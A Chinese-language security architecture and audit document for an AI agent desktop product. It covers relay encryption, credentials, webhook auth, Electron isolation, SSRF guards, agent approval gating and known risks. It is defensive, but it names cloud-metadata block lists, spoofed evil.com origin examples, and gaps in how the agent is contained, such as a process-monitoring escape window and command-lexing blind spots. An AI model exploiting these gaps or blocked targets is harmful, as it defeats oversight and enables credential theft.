- 重放防护：接收端 64 滑动窗口位图（`checkAndRecordCounter`）——窗口内已见拒（重放）、窗口内未见收（乱序补投）、低于窗口下沿拒（有序 WS 下诚实路径不可达，必为重放帧）；认证成功后才提交接收状态（篡改帧不污染窗口）。
- 指纹：`fingerprintOf` = 静态公钥 SHA-256 前 16 hex，TOFU 带外核对。
- wire 契约（帧 kind 常量、E2E_REPLAY_WINDOW、信封形状）单源在 `packages/tianshu-protocol/src/relay-frames.ts`（批 H 上收，三端单源）。

**握手状态机**（控制端 `electron/domains/server/relay-transport.ts`；被控端 `server-face` 对称实现）：

- ws open → 发 e2e-hello（临时对+已存指纹）→ 等 e2e-ack（默认 2s 超时）：指纹匹配（**自算 fingerprintOf，不信任 wire 回显**）→ deriveSessionKeys + createE2ESession，此后 req/res/event 全走信封（状态 encrypted）；TOFU（首连无存档指纹）→ 加密会话可用 + 状态 `pending-confirm`——ack 指纹上报注册表（`ConnectionView.e2eFingerprint`）供确认卡核对，**不自动回填**：用户在主机页指纹核对卡（连接名 + 16hex + mitm-suspect 同款警示）比对被控端设置卡后经 `server:connectionConfirmFingerprint` 显式确认，才钉扎指纹 + `confirmedAt` 落档（P0-1 确认仪式批，2026-11-05）；不匹配 → 断开 + mitm-suspect 态不再重连（用户须核对指纹重配）。连接 E2E 状态值域单源 `packages/tianshu-protocol/src/connection-contract.ts`（六值含 pending-confirm，主进程/渲染层同源）；存量已钉扎连接经 load 迁移视为已确认（补 confirmedAt——option 表 JSON 无行级 createdAt，以升级首见时刻代替，避免升级后全员弹确认卡）。
- 降级语义：auto（缺省）握手超时重试一次明文兼容旧被控端，**降级入审计链**（relay.e2e-degraded，安全批 S2——曾有 2s 超时静默降级明文的审查发现）；required 超时**不降级直接断开**（required-failed，不再重连——堵中继攻击者恒强制降级的缺口）。
- **被控端缺省 required**：`server-face.ts` FaceE2eMode 缺省已收敛为 "required"（安全批 J；类型含 auto/required/off 三值供显式降级）。此前 2026-11-02 审查时为 auto 缺省——该遗留项已闭环。
- 恒明文帧面（与被控端对称）：open/close（relay 配对生命周期）、ping/pong（活性不依赖加密态）；解封失败断开重连换新协商。

**多租户凭证面**（relay-admin 控制平面 + relay 验签，spec 2026-11-03）：

- 密钥地基：`relay/jwt-eddsa.ts`——Ed25519 原生签发/验签 access JWT（零三方依赖，公网暴露面最小化）；claims 含 iss='tianshu-relay' / tid（租户）/ ak / role / quota{maxServers,maxClients} / exp / jti / kid（header 密钥轮换选钥）。verify 三门：Ed25519 签名 + alg 混淆门（header 声明必须仍为 EdDSA）+ iss/exp 语义门；失败一律 null 不区分原因（时序与报文细节不外泄）。
- 签发：`relay-admin/token/token.service.ts`——AK 三要素（Basic 出示 akId:akSecret）→ 30d access JWT；AK secret 库内只存 sha256 摘要（`aks/aks.service.ts`，GitHub PAT 惯例；比对 timingSafeEqual）；akSecret 明文仅签发/轮换时返回一次。
- relay 侧鉴权策略可插拔：`relay/auth.ts` createStaticAuthenticator（共享 token 单租户）/ createJwtAuthenticator（EdDSA 验签 + tid fail-closed + 吊销回调 + 角色白名单——角色取已签名 claims 而非首帧自报）。
- 三租户闸门（relay-main.ts，jwt 模式）：quota 防御闸（tid 在场而 quota 畸形→4001，verify 类型还原不作 wire 保证）→ 配额闸（租户 server/client 连接达 maxServers/maxClients → 4005/4006）→ 顶号闸（同租户重复注册 → 4007）。
- 吊销双路：即时路 `/internal/kick`（RA_INTERNAL_SECRET Bearer，{tenantId?|ak?} 拆匹配在线连接，terminate 立断）；补偿路 CRL 周期拉取（`relay/crl.ts`，45s 缺省，fail-static 缺省/可配 fail-close 只拒新连接永不拆存量）。AK disable/rotate/user-disable 均联动 kick + CRL 落库审计（`relay-admin/relay-link.service.ts`，3s 超时 warn-degrade）。
- 客户端接入（三端四类）：AK 续期阈值单源 `core/relay-credential.ts` shouldRenew（剩 <50% 寿命换发，严格小于：恰 50% 不续）；桌面控制端 `server/relay-ak.ts`（短连接语义——无常驻续期循环，每次建连前 resolveRelayAccessToken 收口：存量新鲜直用零请求/换绑换平面必换/瞬态失败降级存量/401 按 data.reason 分支——disabled·expired·bad-secret 为失败面置 invalid-token 粘滞态，not-found 与不可解析 body 按瞬态；access 内存态不落盘）；被控端 `server-face/renewable-credential.ts`（常驻续期循环）；server 被控端 `relay/relay-client.ts`（env 三要素 TIANSHU_RELAY_ADMIN_URL/AK_ID/AK_SECRET）；移动端双份移植 `apps/tianshu-mobile/src/transport/relay-ak.ts`（core 不进 metro bundle，测试对源码交叉锁定）。
- **AK 生命周期**（`relay-admin/aks/aks.service.ts`）：签发（akId=randomUUID、akSecret=randomBytes(32) hex、expireAt 缺省 365d、前置校验属主 active）/ 轮换 rotate-secret（新 secret 仅本次响应返回，CRL 按 akId 命中不依赖旧值）/ 续期 extend（expireAt 只能延后，等值亦拒——无操作写）/ 禁用 disable·enable（用户级联禁用 ak.cascade-disable 词汇）；全写操作伴行 RaAuditLog。plan→quota 映射单源（beta 档 maxServers=5/maxClients=10，未配置档位 fail-closed 大声失败不静默放行）。

**relay 本体接入安全**（批 I/J 现状）：

- **首帧 auth**：升级后首条消息 `{kind:'auth', token, role, connectionId}` 承载凭证（ws 帧不经反代访问日志）；5s 首帧窗超时 4001。**批 J（2026-11-02 审查后续）已关闭 query 凭证双轨窗口**——URL query 一律无视，凭证只走首帧（relay-main.ts 324–336 行）；零凭证 URL 消除了 proxy/访问日志泄漏面。鉴权层帧（auth/register/迟到畸形帧）不透传给对端（451 行）。
- **内部端点**：`/internal/kick`、`/internal/stats` 走 Bearer internal-secret（与 Ed25519 密钥分域的共享秘密）；kick 请求体尺寸上限（两字段载荷远小于此，超限即恶意/误配置）；kick 语义 terminate 立断（吊销不给告别握手）。
- **帧面约束**：relay 链路 4MiB 帧上限（E2E 信封层）；活性走应用层 ping/pong（25s ping / 60s 无入站判死，`relay/ws-liveness.ts`——undici 全局 WebSocket 无协议层 ping）。
- **双鉴权模式互斥**：`--token`（static 单租户）与 `--auth-pubkey`（jwt 多租户）不可并存（在场即启动期拒绝并给出线索——残留 --token 会全员 4001 且无线索）；公钥配置漏到运行期 = 全员 4001 伪装凭证失败，启动期直接拒。
- TLS：`--cert/--key` 成对传入即 https/wss 监听（客户端零改动）；既定架构为反代终止 TLS，原生通道为可选项（README-relay.md TLS 部署节）。

### 3.6 webhook 安全

**模型**：每图随机 token 路径鉴权（非 HMAC 签名）——`randomBytes(24).hex`（192bit 熵），option 表 `webhook:<graphId>` 行存 JSON 配置（token 经信封密封，`option-secrets.ts` sealNamedSecret）；`POST /webhook/<token>` 触发图运行，未知 token 404（不区分存在性）。

- 桌面端：`electron/domains/ai/orchestration/webhook-server.ts`——本地 http server 仅监听 127.0.0.1（默认 27400，`webhook.port` 可配），无公网暴露面。
- server 端：`apps/tianshu-server/src/modules/webhook/webhook.service.ts`——Nest 控制器同构（mirror 无头端等价，六处环境适配点登记在文件头注释）。

**关键安全语义**：

- token 轮换：重开/改配置生成新 token，同图内存旧条目一并清（否则运行期旧 token 仍可达，轮换语义失效——2026-10 审查修复）。
- 权限对齐：webhook 触发 `codeAuthorized=false`（对齐 default 任务无全权语义）；`WebhookConfig.fullAccess` 默认 false——**外部 token 可达面不给全权**，需图作者显式开启；工具禁用口径与调度/手动/事件触发一致（setWebhookDisabledTools 闭包实时读安全配置）。
- 异步模式（2026-10 审查「webhook 异步」修复）：立即 202 + {jobId, statusUrl}，GET jobs/<id> 轮询；结果内存保留上限 200（bounded-map FIFO 逐出），重启回落 run 表状态（output 不落库）。
- 日志脱敏：webhook token 不落日志与 prometheus 标签（2026-11-02 批二修复项——曾 token 全量入 metrics）。
- 守卫豁免协同：server 端 StaticTokenGuard 对 `/webhook/` 前缀豁免（外部系统不持 TIANSHU_TOKEN），由每图 token 自鉴权兜底——未知 token 404 保证豁免不构成匿名可达面。
- SSRF 联动：webhook 输入可模板化 HTTP 节点 URL（`{{input.x}}`），是图 HTTP 守卫（§3.7）设立的直接威胁模型之一。

### 3.7 运行时与 webview 隔离

**Electron 窗口与 preload 暴露面**：

- 主窗 `electron/main.ts` createWindow：webPreferences 仅显式 `preload` + `webviewTag: true`（nodeIntegration 缺省 false、contextIsolation 缺省 true——Electron 安全缺省，未显式放宽）；生产单实例锁（requestSingleInstanceLock）；硬件加速禁用。
- preload（`electron/preload.ts`）：contextBridge 暴露 `window.ipcRenderer`（on/once/send/invoke 五方法），**全部经通道白名单**（`commons/ipc-channels.ts` 单一事实源：INVOKE/SEND 静态数组 + EVENT 前缀匹配）——渲染层被 XSS 注入时也只能触达白名单内业务通道，白名单外 invoke 抛错、send/监听拒绝并告警；off/removeAllListeners（纯清理无副作用）放行。另暴露 `window.platform` 与 `window.filePath.getPathForFile`（File.path 于 Electron 32 移除的官方替代）——后者解出非空路径时同步发 `file:grant-external-path` 登记外部读授权，**刻意不进通道白名单**：渲染层只能经真实拖拽产生授权（File 对象无法伪造，合成 File 解出空串）。
- 导航控制（`security/renderer-guard.ts`）：主窗 `setWindowOpenHandler` 恒 deny + `handleWindowOpen` 外开——**协议白名单先行**（仅 http(s) 可 openExternal；非 http(s) 一律 deny，2026-11-02 批一修复：曾任意 scheme 交系统处理器，Windows 上 file:// 按扩展名关联程序执行）；外开前过 NetworkGate 域判定。`will-navigate` 白名单（shouldAllowNavigation）：file:// 仅渲染入口 index.html 精确匹配（pathToFileURL 归一），dev server origin 精确比较（堵前缀同形域 `…5173.evil.com` 与 userinfo 伪装 `http://5173@evil.com`）——曾 file:// 前缀全放行，磁盘植入 HTML 可经导航拿到 preload IPC 桥。
- 备用窗口：bridge-executor（webview 桥测试窗）显式 `nodeIntegration: false, contextIsolation: true`；file-window.service 独立 BrowserWindow 同 preload。

**网络域四层拦截**（判定序单源 `security/domain-policy.ts` judgeDomain：豁免面（loopback+provider baseUrl+升级域）> domainDeny > domainAllow > blockAllNetwork > 内置恶意域清单（114 条 abuse.ch URLhaus + OpenPhish 2026-09-16 快照，静态常量永不落盘）> 缺省放行）：

1. undici 全局：`security/network-gate.ts` PolicyDispatcher 包全局 dispatcher（`setPolicyHook` 装配，Application.ts 399 行）——主进程 fetch/LangChain HTTP 出口；
2. 渲染层：`installSessionGuard` session.defaultSession.webRequest onBeforeRequest（http/https）拒即 cancel；
3. browser partition：`ai/browser/browser-session.ts` installBrowserSessionGuard——`persist:browser-webview` 独立持久 partition（登录态跨重启），请求门 = NetworkGate + SSRF metadata 封锁（`security/ssrf-hosts.ts` 三元组：169.254.169.254/metadata.google.internal/metadata.azure.com，与 agent fetch 共用防漂移）；响应头剥离 sanitizeEmbedHeaders（mainFrame/subFrame 剥 X-Frame-Options 与 CSP frame-ancestors——不剥则 GitHub 等设 XFO 的站点无法嵌入）；
4. 子进程：`NetworkGate.childProxyEnv()` 向 bash/MCP stdio 子进程注入 HTTPS_PROXY/HTTP_PROXY/ALL_PROXY 指向本地 CONNECT 代理（`security/local-proxy.ts` LocalConnectProxy，127.0.0.1 随机端口，CONNECT 目标 host 经判定拒 403 + X-Block-Reason）——curl/wget 等独立进程网络外发纳管（与 cmdAsk 13 类命令双保险）。
   资料库预览 webview 另有 `library-preview` partition：http(s) 子资源/外链**全拒**（本地 file:// 预览零外联）。

**webview 行为约束**：browser partition 的 guest 弹窗（target=_blank/window.open）一律 deny，http(s) 转发宿主开新 tab（`registerBrowserGuestPopupForwarding`，app 级 web-contents-created 捕获）；非 browser partition 的 webview 不受影响。browser-actions-ipc 按「整型 id + 存活 + browser partition」三查反查合法 guest（防任意 webContents 借道操控）。

**图 HTTP 节点 SSRF 守卫**（`packages/tianshu-core/src/graph-http-guard.ts`，双端共用）：

- 威胁模型：HTTP 节点 URL 可被 webhook 输入与 LLM 节点输出模板化，响应体可经 responseTemplate 回显——不设守卫即完整 SSRF read-back；agent fetch 工具的 SSRF 清单曾被图节点整面旁路。
- 两级判定：`graphHttpUrlError`（字面级，同步）——协议白名单（仅 http/https）+ 云 metadata 主机 + localhost + 字面/编码 IP（十进制 2130706433、十六进制 0x… 形态）分类（环回/链路本地/私网 A/B/C/CGNAT/保留段、IPv6 ULA/环回/v4 映射）；`graphHttpUrlErrorDns`（DNS 解析级，尾批 F）——域名解析到内网 IP 即拒（防 internal.corp→10.0.0.5 与 DNS rebinding 基础面；解析失败放行，多记录任一命中即拒）。
- 逃生口（2026-11-04 用户裁定）：`GraphHttpUrlPolicy{allowPrivateNetwork, allowlist}`——桌面端=用户本人机器内网全权，执行器恒传 `allowPrivateNetwork: true`（`electron/.../graph-executor.ts` 1163–1166 行）；server 部署态缺省严拦，经 config.yml `tianshu.graph` 段显式登记（`commons/config/tianshu-config.entity.ts`，allowlist 支持精确 IP/域名/IPv4 CIDR；缺省 allowPrivateNetwork=false）。**硬边界不随 policy 变化**（白名单也不豁免）：协议白名单、metadata 三元组、链路本地段（169.254/16 与 IPv6 fe8-eb——云桌面场景防偷凭证）。

**MCP 接入安全**（`electron/domains/ai/agent/mcp-manager.ts` + `ai/mcp/mcp.repo.ts` + `server-face/mcp-tap.ts`）：

- 传输双模：stdio（本地 command/args/env 子进程）/ http（StreamableHTTP）；HTTP 连接前过 NetworkGate judgeUrl（mcp 审计源），stdio 子进程注入代理 env——MCP 网络面纳入四层拦截。
- 工具面预算折叠：单 server 工具面超 4000 token 折叠为 list_tools/call_tool 两聚合工具（langgraph 静态绑定不支持动态挂载，defer 必须在注册层完成）。
- 审批接入：MCP 工具以 `mcp__<server>__<tool>` 前缀注册进 tool-registry；annotations.readOnlyHint===true 记 read（免审），否则记 write——**call_tool kind 恒 write**（目标工具只读性运行时未知，保守走审批）；fullAccess 豁免 MCP 写工具（P4 反馈 2.1）。
- 远程写面裁定（2026-10-26）：被控面 stdio 类型 save 一律拒 `MCP_STDIO_FORBIDDEN`（被控宿主机进程执行面不向远端开放）；HTTP url 必须 http(s)；headers/env 恒掩码（REDACTED_SECRET 三态：undefined 保留 / null 清除 / 含掩码按未传）。

**凭证静态加密**（静态存储层）：

- 主密钥：`security/master-key.ts`——随机 32B 经 Electron safeStorage（macOS Keychain/Windows DPAPI/Linux libsecret）加密落 option 表 `security.masterKey`（`ss:v1:` 形态）；safeStorage 不可用降级 `hex:v1:` 明文形态（仍有信封——挡"拿到库文件"不挡"拿到同机用户上下文"）+ 读时升级（批 G 修复 safeStorageAvailable 递归 bug：恒 false 致 keychain 保护从未生效）；持久化失败宁可明文不落临时密钥（重启后解不开旧密文=凭证永久丢失）。
- 字段信封：`core/crypto-envelope.ts`——AES-256-GCM + `enc:v1:` 前缀自描述 + **AAD 绑定字段名**（密文挪用到其他字段列时 GCM 校验失败，防库内密文移位攻击）+ 随机 nonce（同明文两次加密产不同密文，防等值比对泄露）；旧明文零迁移兼容（读到明文且已有主密钥时懒回写密文）。覆盖：connections 行 token/backupToken/relayToken/akSecret、serverFace 行同族 + e2e 静态私钥、webhook 每图 token、provider apiKey。
- 备份档：`core/backup-archive-crypto.ts`——scrypt N=2^16 口令派生 + AES-256-GCM 档级流式加密（`tsbak:v1` 头 + AAD 绑头行）；jwt-secret 出档 + 恢复轮换 + 目录权限（批三·B）；口令可选（旧明文档零迁移）。

## 4. 业界主流做法对比

| 维度 | 天枢现状 | Claude Code | OpenAI Codex | Dify/Coze 类平台 | 企业零信任/SOC2 |
|---|---|---|---|---|---|
| 权限模式 | default/full 两档（full=显式免责+硬线保留：黑名单与 HIGH/CRITICAL 仍审批；unattended 强拒） | permission modes（default/acceptEdits/plan/bypassPermissions）+ 会话级 `--dangerously-skip-permissions` 逃生门 | approval modes（untrusted/on-failure/on-request/never）绑定 sandbox 强弱 | 平台侧工具开关 + 应用级权限配置，终端用户不感知进程边界 | 零信任按会话持续验证；ABAC 以属性动态判定，天枢的 workspace+toolName 粒度记忆接近资源-主体-动作三元组雏形 |
| 允许清单 | toolPermission 表（workspace×toolName 唯一）+ cmdAllow prefix 规则 + fileAllowlist | settings.json allow/deny 规则（Bash(cmd:*) 精细前缀、Edit(file) 路径 glob），`#` 快捷记忆 | 每 approval 可 "always allow" 白名单化 | 连接器级启用即授权（天枢 mcp__ 前缀免审同构） | 属最小权限原则落地，天枢缺路径级 glob 与 TTL 过期 |
| 命令风险分级 | 内置静态正则 CRITICAL(25)/HIGH(24) 双表，full 不可豁免 | 不内置危险表，靠 allowlist 缺省全 ask + hooks 注入自定义策略 | 沙箱内命令免审批、出网/写界外才审批 | 无命令面（无 bash 工具） | 金融业常见 command whitelisting + 双人复核（四眼原则），天枢 unattended 强拒与之同向 |
| 沙箱 | 进程外无 OS 级沙箱：网络四层拦截 + 子进程 ps 监控 + CONNECT 代理 | hooks（PreToolUse 拦截）+ bash 沙箱（macOS sandbox-exec 模板）+ 容器方案（microVM/Docker 可选） | 系统级沙箱为第一公民：macOS Seatbelt(App Sandbox)/Linux Landlock/容器，网络出向需 env 显式开 | 云端容器隔离，租户间 hypervisor/容器层 | 零信任微隔离（ workload identity ），天枢的 partition 隔离是浏览器语境的对应物 |
| 审批交互 | approval-request chunk → 渲染层横幅（argSummary 摘要）→ agent:approve IPC；拒绝回喂循环继续 | TUI 内联确认（y/n/always），会话内完成 | CLI/TUI 确认 + IDE 面板 | 无人工审批（预授权模型） | ITSM 工单流（ServiceNow 类），带 SLA 与代理审批 |
| 审计 | 哈希链（sequence 单调 + prevHash→hash + verifyChain 复算）+ 命令 preview/hash 双字段脱敏 | 本地 JSONL 转录（session 文件），无防篡改 | 会话日志 + rollouts 云端留痕 | 平台操作日志（DB 落库） | SOC2 CC7.2 要求监控告警留痕；防篡改哈希链对齐 WORM/区块链存证思路，**业界 agent 工具普遍未做**——天枢此项领先 |
| 凭证存储 | safeStorage 主密钥 + AES-GCM 字段信封 + AAD 绑字段名 + 备份口令加密 | keychain 集成（OAuth token 存 OS keychain） | auth.json 明文/系统 keyring | 平台侧 KMS 托管 | 静态加密为 SOC2 CC6.1 基线；信封加密 + 字段级 AAD 为云厂商 KMS envelope 同构 |
| E2E 加密 | X25519+HKDF 双向密钥+GCM+64 滑动窗重放拒+TOFU；relay 零知识（业务帧密文过境） | 不涉及（无中继面） | 不涉及 | 平台 TLS 终止（非 E2E） | Signal 协议=X3DH 前向保密+Double Ratchet 后续保密（每条消息棘轮前进）；MLS(RFC 9420) 树形棘轮支持群组。**天枢差距**：无前向保密（静态私钥泄露可解历史录制流量）、静态私钥长期有效——为已知待办（TOFU 人工核对仪式已于 P0-1 批补齐，见 §3.5） |
| 传输凭证 | 首帧 auth（ws 帧载荷，URL 零凭证）+ EdDSA 非对称租户凭证 + CRL 吊销 | OAuth device flow + PKCE | API key/chatgpt 登录 | API key | mTLS 与短期证书（SPIFFE/SVID）是零信任标杆；天枢 static token 模式（单租户）仍是"知道即通过"对称凭证，jwt 模式已对齐短期凭证方向 |
| SSRF 防护 | 字面+编码 IP+DNS 解析级 + metadata 硬边界 + 平台差异化逃生口 | 无内置 fetch SSRF 清单（WebSearch/WebFetch 域名允许制） | 沙箱网络域即边界 | 平台出网代理白名单 | 云厂商 Function 网关标配（metadata 拦截）；DNS 解析级判定（防 rebinding）与 GCP/Salesforce 同构 |

总体定位：天枢的安全设计在「单机 agent 桌面产品」语境下对齐了 Claude Code 的权限心智（allowed-tools 记忆、审批横幅、默认收窄），在**审计防篡改（哈希链）与中继 E2E** 两项上超出同类桌面 agent 产品；短板在 **OS 级沙箱缺位**（靠应用层四层拦截+进程监控兜底，深度不及 Seatbelt/Landlock）与 **E2E 前向保密缺位**（Signal 级协议未达）。

## 5. 已知遗留与风险清单

对照 `docs/security-audit-2026-11-02.md`（三批收口 + 批 G/H/I 落地）与本次代码核实：

| # | 项 | 审查文档记载 | 本次核实现状（代码证据） |
|---|---|---|---|
| 1 | relay 首帧 auth | 尾批遗留「仅剩首帧 auth」双轨窗口 | **已闭环**：`relay-main.ts` 324 行起 query 凭证一律无视，凭证只走首帧 auth（5s 窗超时 4001）；四端客户端已全部切换 |
| 2 | 被控端缺省 required | 尾批遗留「被控端可收敛全局 required」 | **已闭环**：`server-face.ts` FaceE2eMode 缺省 "required"（安全批 J 收敛）；auto/off 仍可显式配置 |
| 3 | TOFU 指纹自动回填无用户确认 | 高危 #4 待办（需 UI） | **已闭环**：TOFU 首连不再自动回填——`relay-transport.ts` 落 `pending-confirm`（加密会话可用但指纹待核对，mitm-suspect 同款警示 + 主机页指纹核对卡），用户确认（`connections.ts confirmFingerprint`）才钉扎 + `confirmedAt` 落档并重建握手强制校验；存量已钉扎连接经迁移视为已确认（P0-1 批，2026-11-05） |
| 4 | relay TLS | 高危 #5「TLS 待办」 | **部分闭环**：批 I 落地 `--cert/--key` 原生 TLS 可选项；既定架构仍依赖反代终止 TLS，部署面已加非 loopback 明文监听启动告警（P2-1，2026-11-05）——强制拒绝未做 |
| 5 | server 端操作日志 | 中危收口清单未含 | **已闭环**：`operation-log.interceptor.ts` 配置驱动启用（config `operationLog.enabled` 缺省 true，P0-2 批 2026-11-05）；details 脱敏对齐桌面审计链 commandPreview 口径（IP/UA 表列既有） |
| 6 | 静态 token 对称凭证 | 批 I 注（static 模式现状平移） | 设计内保留：单租户 `--token` 模式仍是"知道即通过"，泄露即全量失守（jwt 模式已是非对称短期凭证，两模式互斥共存） |
| 7 | E2E 无前向保密 | 审查文档未列（本轮分析） | 静态身份私钥长期有效、无棘轮进阶：私钥泄露可回解历史录制流量（Signal Double Ratchet / MLS 级别的后向保密未达）；降级审计已兜底但 auto 模式仍可被中继攻击者压降级 |
| 8 | OS 级沙箱缺位 | 审查未列（设计边界） | 应用层防护（四层网络拦截+ps 监控+代理）完整，但无 Seatbelt/Landlock 进程隔离：子进程在用户全权限上下文运行，ps 轮询 1s 间隔存在逃逸窗口，win32 子进程监控 no-op |
| 9 | 命令词法粗分 | command-risk.ts 头注释自认 | 简化 shell 词法（无引号感知）+ 正则分段为已声明精度边界：引号内分隔符误分、命令替换混淆依赖子进程监控与审批兜底 |
| 10 | workspace.writeApprovedAt 滞留 | — | schema 字段仍在、读取路径已废弃（chat.service.ts 1604 行注释），属无害但易误读的历史包袱 |
| 11 | relay-admin 独立部署面 | README-relay.md | Dockerfile.relay 零业务代码仅 5 个 relay js + ws + 协议包——攻击面收敛良好；但 relay-admin 与 relay 间 internal-secret 为共享对称秘密（与 Ed25519 分域已声明） |
| 12 | 图 HTTP 桌面端全放开 | 2026-11-04 裁定 | 桌面 `allowPrivateNetwork: true` 恒真——用户裁定（本人机器内网全权）而非疏漏；metadata/链路本地硬边界仍在 |

## 6. 改进空间

按优先级（P0 最高），均为可落地项：

**P0-1 TOFU 指纹确认 UI**（遗留 #3）：~~控制端首连 TOFU 时在主机页弹指纹核对卡（fingerprintOf 16hex + 连接名），用户确认后才回填 `connections` 行；未确认前按 mitm-suspect 同款呈现。~~ ✅ 已落地（2026-11-05）：`server/relay-transport.ts` TOFU 分支落 `pending-confirm`（通信可用，不再自动回填）；`connections.ts confirmFingerprint`（IPC `server:connectionConfirmFingerprint`）钉扎指纹 + `confirmedAt` 并重建 transport 强制校验；主机页 `E2eFingerprintCard`（连接名 + 指纹常显 + 核对确认动作，pending/mitm 双警示态）；协议类型单源 `@tianshu/protocol` `connection-contract.ts`；存量已回填连接经 load 迁移视为已确认。

**P0-2 server 操作日志启用**（遗留 #5）：~~将 `operation-log.interceptor.ts` DISABLE_LOG 改为配置驱动（config.yml `operationLog.enabled`，缺省 true），补 Jest 用例；运维侧对齐桌面审计链的 commandPreview 脱敏口径（IP/UA 已有）。~~ ✅ 已落地（2026-11-05）：`operation-log.interceptor.ts` 注入 ConfigService 读 `operationLog.enabled`（缺省 true，false 直通不落表）；details 脱敏对齐桌面审计链 commandPreview 口径（method + url 预览：token query/webhook 路径段打码 + 截断 100 字符，params/query/body 不落），打码函数与请求日志拦截器抽 `url-sanitize.util.ts` 单源；Jest 用例 `test/modules/operation-log-interceptor.spec.ts`（开关四态/脱敏/跳过装饰器/无认证面/ERROR 路径/IP-UA）。

**P1-1 E2E 前向保密升级**（遗留 #7）：握手加入被控端静态密钥签名绑定（静态对当前仅做 ECDH，无身份签名——可叠 Ed25519 签 ack 防主动 MITM 而非仅 TOFU），并评估每连接双棘轮（对齐 Signal Double Ratchet 的简化版：以 HKDF(chainKey) 逐帧进阶）；wire 契约经 protocol 包单源演进，三端交叉向量测试护栏已有。

**P1-2 OS 级沙箱引入**（遗留 #8）：macOS 走 sandbox-exec 模板（网络白名单 + 工作空间写白名单，Claude Code 同构）、Linux 走 Landlock（kernel 5.13+）；落地路径为 bash 工具 execute 处按平台包一层 sandbox 启动器，NetworkGate 的代理 env 继续生效；win32 维持现状并诚实声明。

**P1-3 审批面细粒度化**：toolPermission 记忆粒度当前是 workspace×toolName——bash 无参数前缀记忆（Claude Code `Bash(git push:*)` 同款）、write 无路径 glob 记忆；cmdAllow 已有 prefix 规则可复用其数据结构，审批横幅「始终允许」下拉带出参数前缀选项。

**P2-1 server 部署面 TLS 强制**：~~`listen-host.ts` 非 loopback 监听时若 relay 未配 TLS 且无反代头标识，启动告警/可配拒绝（对齐 TIANSHU_TOKEN「非 loopback 无 token 拒绝启动」先例）。~~ ✅ 告警形态已落地（2026-11-05，只告警不拒绝）：`listen-host.ts` `emitNonLoopbackTlsWarning`——非 loopback 监听且 relay 客户端 URL 非 wss:// 且无反代终止声明时启动告警（[安全告警] 前缀 + 指引配置面，TIANSHU_TOKEN 告警同形态）；豁免标识 `config app.tlsBehindProxy: true` / env `TIANSHU_TLS_PROXY=1`（本 HTTP 面无原生 TLS 通道，强制拒绝会拦死合法明文内网部署，故收敛为告警；main.ts 启动期接线，relay 解析前置）。可配拒绝留待需要时再加。

**P2-2 审计链外部锚定**：桌面哈希链的单点弱点是"整库可删重建"（clear 自身留痕但攻击者可直接改库文件）——定期将链尾 hash 锚定到外部（系统 keychain 属性或 relay-admin 侧），与 verifyChain 配套做启动自检告警。

**P2-3 disabledTools 与 MCP 写面联动收口**：MCP call_tool 恒 write 走审批已达标；可进一步把 readOnlyHint=true 的 MCP read 工具纳入 BUILTIN_TOOLS 同款运行时开关面（当前 disabledTools 只覆盖内置 14 项）。

**P3-1 清理 workspace.writeApprovedAt 滞留字段**（遗留 #10）：随下次 schema 变更窗口（发布后逐版 vN 脚本）移除或注明 deprecated，消除误读面。
